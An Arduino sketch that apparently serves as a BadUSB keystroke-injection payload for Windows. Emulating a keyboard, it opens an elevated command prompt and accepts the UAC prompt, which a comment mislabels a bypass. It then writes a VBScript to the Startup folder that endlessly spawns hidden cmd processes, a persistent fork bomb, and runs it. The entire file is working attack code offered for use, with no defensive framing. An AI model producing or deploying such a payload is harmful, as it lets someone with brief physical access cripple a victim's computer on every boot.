#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  delay(1000);
  // ^ You should set more delay time if your computer is slow or if the script doesn't work correctly.
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ESC);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cmd");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  // ^ UAC Bypass
  delay(500);

  Keyboard.print("copy con \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\FB.vbs\"");
  // ^ Installing the .vbs on startup folder
  
  typeKey(KEY_RETURN);

  Keyboard.print("do");

  typeKey(KEY_RETURN);

  Keyboard.print("CreateObject(\"Wscript.Shell\").Run \"cmd\", 0, False");

  typeKey(KEY_RETURN);

  Keyboard.print("loop");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("start FB.vbs && exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
